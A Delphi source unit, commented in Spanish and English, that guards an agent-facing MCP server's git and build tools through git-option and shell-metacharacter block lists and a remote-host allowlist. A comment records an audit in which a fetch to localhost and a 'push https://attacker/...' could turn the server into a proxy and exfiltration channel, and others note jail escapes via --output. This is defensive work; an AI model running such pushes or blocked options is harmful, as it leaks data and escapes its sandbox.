unit Lsp.Args;

{ LOS ARGUMENTOS DE UNA ORDEN: las puertas de lo que llega a
  la linea de git y de los lanzadores (GitArgDenied, GitRemoteDenied con su
  lector de host GitUrlHost, ShellArgDenied), la clasificacion de una orden
  de git en consulta o escritura (GitCommandIsQuery) y el nombre del fichero
  del mensaje de un commit (NombreDeMensajeGit).

  Salen de Lsp.Guard el 8-oct-2026 (la 1.18.0, la version de la limpieza),
  movidos sin cambiar una linea, con PrimerTrozo, el unico trozo de la jaula
  que usaban. Van DEBAJO de la jaula: la puerta de entrada (ToolCallDenied)
  y la credencial de solo lectura preguntan aqui, y aqui solo se pregunta a
  Lsp.Settings (los remotos declarados) y a Lsp.Casa (la temporal del
  servidor). El troceador de una linea (TrocearArgs) y su compositor
  (EnComillas) bajaron a Lsp.ProcessLaunch el 9-oct-2026, con el lanzador:
  asi los alcanza tambien McpRunJob, que tenia una gemela (ComillasWin). }

interface

{ El primer trozo de S partido por ASeps; '' si S es ''. S.Split(...)[0] a
  secas lee fuera del array cuando S es '' (Delphi devuelve un array
  VACIO): un Access violation medido el 25-ago en delphi_edit y parcheado
  en ESE sitio, y otra vez el 26-sep en delphi_textedit (una tanda con un
  ancla vacia y "occurrence"), con otros cinco Split()[0] sueltos. }
function PrimerTrozo(const S: string; const ASeps: array of Char): string;

function NombreDeMensajeGit: string;

{ La mitad de CONSULTA de delphi_git: lo que una credencial de solo lectura
  y un proyecto de REFERENCIA (ReadOnlyRoots) pueden ejecutar. UNA lista:
  la consulta ToolCallDenied y la consulta la propia tool. }
function GitCommandIsQuery(const ACmd, AArgs, AMessage: string): Boolean;

{ '' when AText carries none of the shell metacharacters that would break a
  command line ( ; | & ` $ < > and newlines ), otherwise a refusal. For tool
  arguments that end up on a paclient/msbuild command line. }
function ShellArgDenied(const AText: string): string;

{ Whether a git argument names a remote the operator has NOT allowed.

  Measured 2026-08-25 by an auditor working only through MCP: `delphi_git
  command=fetch args="http://127.0.0.1:3131/mcp"` made the SERVER open a
  connection to that address, and `push https://attacker/... HEAD:main` would
  have walked the jail's contents out of the building. The agent's universe is
  supposed to end at the jail; an arbitrary outbound URL turns the server into
  a proxy into its own network (localhost, internal services, metadata
  endpoints) and into an exfiltration channel.

  Toda direccion de red pasa por GitRemotes= del workspace activo, una
  lista de hosts que declara el operador. Vacia (el valor por defecto),
  niega tanto las direcciones de la llamada como las de un remoto del repo.
  Solo el operador decide los hosts con los que esta maquina puede hablar. }
function GitRemoteDenied(const AText: string; AScpCorto: Boolean = False): string;

{ El host de una direccion de RED de git; '' si no lo es (un nombre, una
  rama, una carpeta). El lector de GitRemoteDenied, en la interface desde la
  1.7.7: la tool de git pregunta con el si el remoto de una llamada es de red
  o es una carpeta, que pasa por la jaula. UN lector de "esto es una
  direccion de red". }
function GitUrlHost(const AToken: string; AScpCorto: Boolean = False): string;

{ La puerta de los argumentos libres de git (que niega y por que, en su nota
  de la implementacion): la pregunta la puerta de entrada de Lsp.Guard
  (ReglasDeLaLlamadaDenegadas). }
function GitArgDenied(const AArgs, ACmd: string): string;

implementation

uses
  System.SysUtils,
  System.StrUtils,
  System.IOUtils,
  System.RegularExpressions,
  Lsp.ProcessLaunch,    // TrocearArgs: el troceador de la linea, y su inversa EnComillas
  Lsp.Texts,
  Lsp.Settings,         // GitRemoteHosts y HostsDeLista: los remotos que declara el workspace
  Lsp.Casa;             // ServerTempDir y FragmentoUnico: el mensaje de un commit, en la casa

{ UN nombrador del fichero -F de git, junto a su filtro de argumentos. }
function NombreDeMensajeGit: string;
begin
  Result := TPath.Combine(ServerTempDir('git'),
    'msg-' + FragmentoUnico + '.txt');
end;

{ Las opciones que traen ficheros o configuracion ajena al filtro. Git admite
  prefijos largos y grupos cortos (-aF, -qF, -nc): se juzgan las dos formas. }
function OpcionDeFicheroGit(const ATok: string): Boolean;
var
  Opcion: string;
  P, I: Integer;
begin
  Result := False;
  if ATok.StartsWith('--') then
  begin
    Opcion := LowerCase(ATok);
    P := Pos('=', Opcion);
    if P > 0 then
      Opcion := Copy(Opcion, 1, P - 1);
    if Length(Opcion) > 2 then
      Result := '--file'.StartsWith(Opcion) or
        '--pathspec-from-file'.StartsWith(Opcion) or
        '--config'.StartsWith(Opcion);
  end
  else if ATok.StartsWith('-') then
  begin
    // -S<texto> y -G<texto> (el pickaxe de git log/diff, SOLO LECTURA): el
    // resto del token es el VALOR de busqueda, no un grupo de opciones cortas.
    // No se analiza: un valor con 'F'/'O'/'c' no es -F/-O/-c (medido 2026-10-06:
    // `git log -SOpen` caia por la 'O' del valor). El valor no abre nada -no es
    // ruta, ni fichero, ni comando- y los metacaracteres de shell ya los corta
    // TrocearArgs. -S y -G siempre llevan valor; no se agrupan con otras.
    if (Length(ATok) > 2) and CharInSet(ATok[2], ['S', 'G']) then
      Exit(False);
    // Mayusculas: -f no es -F, y -o no es -O.
    Result := (Pos('F', ATok) > 0) or (Pos('O', ATok) > 0);
    if Result then
      Exit;
    Opcion := LowerCase(ATok);
    for I := 2 to Length(Opcion) do
    begin
      if Opcion[I] = 'c' then
        Exit(True);
      // Opciones sin valor de clone; -b/-u/-o/-j consumen lo que sigue.
      // No tratar la c de -bfeaturec como otra opcion del grupo.
      if not CharInSet(Opcion[I], ['n', 'v', 'q', 'l', 's']) then
        Break;
    end;
  end;
end;

{ Filtro de opciones peligrosas de git en la UNICA puerta: git tiene opciones
  que escriben ficheros, leen rutas FUERA del repo o ejecutan un programa - una
  fuga de la jaula usable hasta por un cliente de solo lectura (medido: `diff
  --output=<ruta abs>` escribio un fichero en cualquier sitio del disco, y
  --o"utput"= se colaba cuando la puerta troceaba solo por espacios mientras el
  CRT de git quitaba las comillas y la ejecutaba). Trocea con TrocearArgs - el
  mismo lector cuya inversa usa el ejecutor para componer la linea -, asi que
  cada token se juzga TAL COMO lo recibira git. Lo pregunta la puerta, para que
  valga en AMBOS niveles de acceso (el -C <repo> no frena un --output absoluto).
  '' = limpio. }
{ LISTA NEGRA: argumentos libres de git, con opciones peligrosas conocidas.
  La config y los remotos tienen sus puertas cerradas independientes. }
function GitArgDenied(const AArgs, ACmd: string): string;
var
  Tok, T: string;
begin
  Result := '';
  for Tok in TrocearArgs(AArgs) do
  begin
    T := Tok.ToLower;
    if MatchText(ACmd, ['commit', 'tag']) then
    begin
      // Git admite abreviaciones largas y grupos cortos: --gpg, -aS, -fs.
      // Una opcion que consume texto corta el grupo; la S de -mMENSAJE no firma.
      var Opcion := PrimerTrozo(T, ['=']);
      // Firma REAL (gpg): se niega. --signoff / -s / --sign en commit solo
      // ponen "Signed-off-by" y NO firman -> se admiten; en tag, --sign SI es
      // -s (gpg), por eso su prefijo se niega solo ahi.
      var Firma := (Length(Opcion) >= 3) and
        ('--gpg-sign'.StartsWith(Opcion) or
         ((ACmd = 'tag') and '--sign'.StartsWith(Opcion)) or
         ((ACmd = 'tag') and '--local-user'.StartsWith(Opcion)));
      if Tok.StartsWith('-') and not Tok.StartsWith('--') then
        for var I := 2 to Length(Tok) do
        begin
          if (Tok[I] = 'S') or ((ACmd = 'tag') and CharInSet(Tok[I], ['s', 'u'])) then
          begin
            Firma := True;
            Break;
          end;
          if not CharInSet(Tok[I], ['a', 'f', 'v', 'q', 'e', 'i', 'o', 'd', 'l']) then
            Break;
        end;
      if Firma then
        Exit(MsgFmt(SR_GIT_OPTION_FMT, [Tok]));
    end;
    if OpcionDeFicheroGit(Tok) or
       T.StartsWith('--output') or          // writes a file (diff/show)
       T.StartsWith('--no-index') or        // reads arbitrary paths, any dir
       T.StartsWith('--upload-pack') or T.StartsWith('--receive-pack') or
       T.StartsWith('--exec') or            // runs a remote/local command
       T.StartsWith('--ext-diff') or T.StartsWith('--textconv') or // ext program
       // Configuracion: tambien prefijos y grupos, en OpcionDeFicheroGit.
       T.StartsWith('--separate-git-dir') or T.StartsWith('--template') or // write/read outside the dest
       T.StartsWith('--git-dir') or T.StartsWith('--work-tree') or // redirect where git operates -> jail escape
       (T = '-o') or T.StartsWith('-o=') or T.StartsWith('-o/') or T.StartsWith('-o\') then
      Exit(MsgFmt(SR_GIT_OPTION_FMT, [Tok]));
  end;
end;

{ Host of a git URL, '' when the token is not a URL at all. Understands the
  two shapes git takes: scheme://[user@]host[:port]/... and the scp-like
  [user@]host:path. }
function GitUrlHost(const AToken: string; AScpCorto: Boolean): string;
var
  T: string;
  P: Integer;
  EsUrl, Corchete: Boolean;
begin
  Result := '';
  T := AToken.Trim.Trim(['"', '''']);
  P := Pos('://', T);
  EsUrl := P > 0;
  if EsUrl then
    T := Copy(T, P + 3, MaxInt)
  else if not ((Pos('@', T) > 0) and (Pos(':', T) > Pos('@', T))) and
          not (AScpCorto and TRegEx.IsMatch(T, '^[A-Za-z0-9][A-Za-z0-9.-]+:[^:\\]')) then
    { scp corto host:ruta: dos letras o mas antes del ':' -> no es una unidad
      (C:\ o C:/) }
    Exit; // not a URL: a branch, a path, an option
  { LA AUTORIDAD ([user@]host[:puerto]) acaba en la primera / \ ? # de una
    URL, o en el primer ':' de la forma scp (lo que sigue es la ruta), fuera
    de unos corchetes. Una @ que venga DESPUES es del camino, no del usuario:
    https://ejemplo.invalido/x@github.com y git@ejemplo.invalido:x@github.com
    conectan con ejemplo.invalido, y esta puerta leia github.com (revisor
    "adivinar vs medir", 8-oct-2026). }
  Corchete := False;
  for P := 1 to Length(T) do
    if T[P] = '[' then
      Corchete := True
    else if T[P] = ']' then
      Corchete := False
    else if not Corchete and (CharInSet(T[P], ['/', '\', '?', '#']) or
            (not EsUrl and (T[P] = ':'))) then
    begin
      T := Copy(T, 1, P - 1);
      Break;
    end;
  // [user@]host: DOS @ en la autoridad es ambiguo (cada programa lee una
  // distinta) y se niega en vez de adivinar: un host con @ no casa con
  // ninguno de la lista
  P := Pos('@', T);
  if P > 0 then
  begin
    if Pos('@', T, P + 1) > 0 then
      Exit(T.Trim.ToLower);
    T := Copy(T, P + 1, MaxInt);
  end;
  // [::1]:3131 - the host is what the brackets hold, not the bracket
  if T.StartsWith('[') then
  begin
    P := Pos(']', T);
    if P > 1 then
      Exit(Copy(T, 2, P - 2).Trim.ToLower);
    Exit('[' + T); // malformed: keep it unrecognisable so it cannot match
  end;
  P := Pos(':', T); // el puerto de una URL
  if P > 0 then
    T := Copy(T, 1, P - 1);
  Result := T.Trim.ToLower;
end;

function GitRemoteDenied(const AText: string; AScpCorto: Boolean): string;
var
  Tok, Host, Allowed: string;
  Ok: Boolean;
begin
  Result := '';
  for Tok in TrocearArgs(AText) do
  begin
    Host := GitUrlHost(Tok, AScpCorto);
    if Host = '' then
      Continue;
    Allowed := GitRemoteHosts;
    if Allowed = '' then
      Exit(MsgFmt(SR_GIT_REMOTE_OFF_FMT, [Host]));
    Ok := False;
    for var H in HostsDeLista(Allowed) do
      if SameText(H, Host) then
      begin
        Ok := True;
        Break;
      end;
    if not Ok then
      Exit(MsgFmt(SR_GIT_REMOTE_HOST_FMT, [Host, Allowed]));
  end;
end;

{ LISTA NEGRA: metacaracteres de shell conocidos; no sustituye las listas
  blancas de ordenes, identificadores o plataformas de cada herramienta. }
function ShellArgDenied(const AText: string): string;
const
  Bad: array [0 .. 8] of string = (';', '|', '&', '`', '$', '<', '>', #13, #10);
var
  B: string;
begin
  Result := '';
  for B in Bad do
    if AText.Contains(B) then
      Exit(MsgFmt(SR_SHELL_META_FMT, [B]));
end;

function GitCommandIsQuery(const ACmd, AArgs, AMessage: string): Boolean;
begin
  Result := MatchText(Trim(ACmd), ['status', 'diff', 'log', 'show', 'ls-remote']) or
    (MatchText(Trim(ACmd), ['branch', 'tag']) and (Trim(AArgs) = '') and (Trim(AMessage) = '')) or
    // worktree list solo ENSENA las copias de trabajo (1.4.0)
    (SameText(Trim(ACmd), 'worktree') and SameText(Trim(AArgs), 'list')) or
    // ...y stash list, lo aparcado: pasaba por escritura, con el cerrojo
    // de los escritores y parando los motores del repo (1.7.7)
    (SameText(Trim(ACmd), 'stash') and SameText(Trim(AArgs), 'list'));
end;

function PrimerTrozo(const S: string; const ASeps: array of Char): string;
var
  Partes: TArray<string>;
begin
  Partes := S.Split(ASeps);
  if Length(Partes) = 0 then
    Result := ''
  else
    Result := Partes[0];
end;

end.